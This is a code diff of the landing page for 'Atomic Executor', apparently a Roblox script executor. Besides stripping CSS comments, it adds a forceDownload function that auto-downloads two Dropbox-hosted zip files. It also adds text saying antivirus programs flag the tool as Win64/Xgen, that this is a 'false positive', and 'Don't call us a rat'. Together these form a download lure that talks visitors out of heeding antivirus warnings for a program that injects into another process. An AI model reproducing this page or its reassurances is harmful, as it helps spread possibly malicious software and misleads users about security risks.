@@ -91,12 +91,12 @@
 
         .feature:hover {
             transform: translateY(-10px);
-            box-shadow: 0 8px 24px rgba(187, 134, 252, 0.4); /* Purple shadow */
+            box-shadow: 0 8px 24px rgba(187, 134, 252, 0.4);
         }
 
         .feature-icon {
             font-size: 32px;
-            color: #bb86fc; /* Purple accent */
+            color: #bb86fc;
             margin-bottom: 15px;
         }
 
@@ -120,8 +120,8 @@
         }
 
         .download-button {
-            background-color: #bb86fc; /* Purple accent */
-            color: #1a1a1a; /* Dark text */
+            background-color: #bb86fc;
+            color: #1a1a1a;
             border: none;
             border-radius: 12px;
             padding: 15px 30px;
@@ -134,7 +134,7 @@
         }
 
         .download-button:hover {
-            background-color: #9a67ea; /* Darker purple on hover */
+            background-color: #9a67ea;
             transform: scale(1.05);
         }
 
@@ -240,7 +240,7 @@
             border-radius: 12px;
             margin-bottom: 15px;
             animation: zoomIn 1s ease-in-out;
-            display: none; /* Hidden by default */
+            display: none;
         }
 
         @keyframes zoomIn {
@@ -401,12 +401,33 @@
         const bootstrapperButton = document.getElementById('bootstrapperButton');
         const manualDownloadButton = document.getElementById('manualDownloadButton');
 
+        // Function to force download
+        function forceDownload(url, fileName) {
+            const anchor = document.createElement('a');
+            anchor.href = url;
+            anchor.download = fileName || url.split('/').pop();
+            document.body.appendChild(anchor);
+            anchor.click();
+            document.body.removeChild(anchor);
+            
+            // Fallback for browsers that don't support the download attribute
+            setTimeout(() => {
+                window.location.href = url;
+            }, 200);
+        }
+
         bootstrapperButton.addEventListener('click', () => {
-            window.location.href = 'https://www.dropbox.com/scl/fi/4pumxyogyfh07loiwb8xo/Atomic-BootStrapper.zip?rlkey=peue51801jnsgyayna6wtxrpd&st=tqqciaer&dl=1';
+            forceDownload(
+                'https://www.dropbox.com/scl/fi/4pumxyogyfh07loiwb8xo/Atomic-BootStrapper.zip?rlkey=peue51801jnsgyayna6wtxrpd&st=tqqciaer&dl=1',
+                'Atomic-Bootstrapper.zip'
+            );
         });
 
         manualDownloadButton.addEventListener('click', () => {
-            window.location.href = 'https://www.dropbox.com/scl/fi/nruf3re381rgacdbr2gxh/atomic.zip?rlkey=x3m35hlsjaciloqck7717t957&st=4kmdbptz&dl=0';
+            forceDownload(
+                'https://www.dropbox.com/scl/fi/nruf3re381rgacdbr2gxh/atomic.zip?rlkey=x3m35hlsjaciloqck7717t957&st=4kmdbptz&dl=1',
+                'Atomic-Executor.zip'
+            );
         });
 
         // Show hidden support channel after joining Discord
@@ -416,7 +437,7 @@
         discordButton.addEventListener('click', () => {
             setTimeout(() => {
                 hiddenChannel.style.display = 'block';
-            }, 1000); // Simulate delay for joining Discord
+            }, 1000);
         });
 
         // Toggle proof image visibility
@@ -424,10 +445,16 @@
             const proofImage = document.getElementById('proofImage');
             const atlantisImage = document.getElementById('atlantisImage');
             const proofDescription = document.getElementById('proofDescription');
+            
             if (proofImage.style.display === 'none' || !proofImage.style.display) {
                 proofImage.style.display = 'block';
                 atlantisImage.style.display = 'block';
-                proofDescription.textContent = "Atomic Executor is flagged as Win64/Xgen by some antivirus programs because it injects into Roblox, which is a common behavior for executors. This is a false positive. It only edits Roblox files to enable scripting and does not harm your system. Compare this to other popular executors like Atlantis (60k+ users), which are also flagged but widely trusted. Don't call us a rat—this is how executors work!";
+                proofDescription.innerHTML = `
+                    Atomic Executor is flagged as <strong>Win64/Xgen</strong> by some antivirus programs because it injects into Roblox, 
+                    which is a common behavior for executors. This is a <strong>false positive</strong>. It only edits Roblox files 
+                    to enable scripting and does not harm your system. Compare this to other popular executors like 
+                    <strong>Atlantis</strong> (60k+ users), which are also flagged but widely trusted. Don't call us a rat—this is how executors work!
+                `;
             } else {
                 proofImage.style.display = 'none';
                 atlantisImage.style.display = 'none';
